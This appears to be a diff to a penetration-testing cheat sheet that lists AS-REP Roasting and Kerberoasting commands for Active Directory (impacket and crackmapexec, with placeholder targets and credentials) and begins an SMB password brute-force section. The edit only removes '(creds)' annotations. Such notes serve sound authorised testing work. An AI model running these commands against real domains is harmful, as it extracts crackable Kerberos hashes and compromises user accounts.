@@ -8,12 +8,12 @@ Check a password for userlist:
 
 AS-REP (AS-REP Roasting):
 `impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/ -usersfile <USERLIST>` 
-`impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -request` (creds)
-`crackmapexec ldap <IP> --kdcHost <IP> -u <USER> -p <PASS> --asreproast <OUTPUT>` (creds)
+`impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -request`
+`crackmapexec ldap <IP> --kdcHost <IP> -u <USER> -p <PASS> --asreproast <OUTPUT>`
 
 TGS-REP (Kerberoasting):
-`impacket-GetUserSPNs -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -request` (creds)
-`crackmapexec ldap <IP> --kdcHost <IP> -u <USER> -p <PASS> --kerberoasting <OUTPUT>` (creds)
+`impacket-GetUserSPNs -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -request`
+`crackmapexec ldap <IP> --kdcHost <IP> -u <USER> -p <PASS> --kerberoasting <OUTPUT>`
 
 ## NetBIOS & SMB
 Brute force passwords - WILL LOCKOUT USER:
